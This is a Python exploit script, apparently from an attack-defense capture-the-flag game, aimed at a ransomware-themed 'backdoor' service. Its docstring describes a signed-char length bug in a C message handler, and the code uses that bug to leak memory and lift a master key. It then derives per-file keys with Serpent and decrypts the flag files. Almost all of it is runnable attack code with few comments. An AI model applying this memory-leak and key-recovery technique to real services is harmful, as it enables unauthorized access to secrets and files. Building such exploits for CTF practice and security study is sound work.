import sys
import os
import random
import string
# pip install pycryptoplus
from CryptoPlus.Cipher import python_Serpent as Serpent

try:
    from .connector import BackdoorConnector
except ImportError:
    from connector import BackdoorConnector
os.environ['PWNLIB_NOTERM'] = '1'


"""
Message parser for RANSOM_MESSAGE has signed/unsigned confusion. 
Byte 0x80 is interpreted as -128, meaning the file's content is read from memory before the message buffer. 
This memory contains the secret key used to build file access tokens for RANSOM_DECRYPT.

ransoM_cmd.c:
void ransom_message_cmd(struct IncomingMessage *msg, char *data, int len) {  // char = signed char
    int s1len = data[0];   // signed => signed expansion. s1len = -128
"""


def xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def key_derivation(master_key: bytes, fname: str) -> bytes:
    blocks = (fname.encode() + b'\x00' * 32)[:32]
    serpent = Serpent.new(master_key)
    key = xor(serpent.encrypt(blocks[:16]), serpent.encrypt(blocks[16:32]))
    return key


def exploit(target, flag_ids):
    with BackdoorConnector(target, True) as connector:
        # leak some memory exploiting RANSOM_MESSAGE string length sign-ness
        fname = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20)) + '.txt'
        connector.check_command(b'RANSOM_MESSAGE\x00\x80' + fname.encode() + b'\x00')  # 0-byte terminates filename for checker function
        memleak = connector.check_command(b'STEAL\x00' + fname.encode())
        master_key = memleak[48:48 + 16]  # offsets found out experimentally

        for flag_id in flag_ids:
            fname = flag_id + '.txt'
            file_key = key_derivation(master_key, fname)
            print('KEY =', file_key)
            result = connector.check_command(b'RANSOM_DECRYPT\x00' + file_key + flag_id.encode() + '.txt'.encode())
            print('RESULT =', result)


if __name__ == '__main__':
    exploit(sys.argv[1], sys.argv[2].split(','))
